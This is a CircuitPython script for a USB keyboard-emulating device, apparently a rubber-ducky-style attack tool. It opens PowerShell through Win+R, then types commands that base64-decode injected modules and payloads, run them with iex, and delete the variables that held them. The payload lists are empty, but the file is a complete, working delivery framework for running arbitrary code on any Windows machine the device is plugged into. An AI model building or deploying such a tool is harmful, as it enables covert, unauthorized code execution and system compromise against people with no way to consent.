
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
import time

# Insert encoded, pre-built scripts here

modules=[

]

# Insert Encoded Payloads here
payloads=[

]

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(6)

# Spawn Powershell

kbd.press(Keycode.WINDOWS)
time.sleep(.09)
kbd.press(Keycode.R)
time.sleep(.09)
kbd.release(Keycode.WINDOWS)
time.sleep(.09)
kbd.release(Keycode.R)
time.sleep(1)	
layout.write("powershell")
kbd.press(Keycode.ENTER)
time.sleep(.09)
kbd.release(Keycode.ENTER)
time.sleep(2)

# Decode Payloads

prefix = "$a = \""
suffix = '''\"
$an = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))
iex $an
Remove-Variable a
Remove-Variable an
'''


# Load Modules
for module in modules:
	layout.write(prefix+module+suffix)

# Execute Payloads
for enc_pay in payloads:
	layout.write(prefix+enc_pay+suffix)

# Exit Powershell
layout.write("exit\n")